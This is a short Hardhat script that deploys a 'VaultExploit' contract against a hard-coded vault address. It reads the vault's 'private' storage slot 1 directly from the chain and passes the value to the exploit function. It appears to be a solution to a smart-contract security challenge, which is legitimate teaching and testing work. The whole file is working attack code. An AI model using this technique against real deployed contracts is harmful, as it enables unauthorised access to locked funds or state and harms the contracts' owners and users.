import { ethers } from "hardhat";

async function main() {
  const [exploiter] = await ethers.getSigners();

  const vaultAddress = "0x2052973E39623deb0ECE92228e82d1344C216814";

  const _vaultExploit = await ethers.getContractFactory("VaultExploit");
  const VaultExploit = await _vaultExploit
    .connect(exploiter)
    .deploy(vaultAddress);
  await VaultExploit.deployed();

  // read private variable from `Vault` contract
  const slot1 = await ethers.provider.getStorageAt(vaultAddress, 1);
  const tx = await VaultExploit.exploit(slot1);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
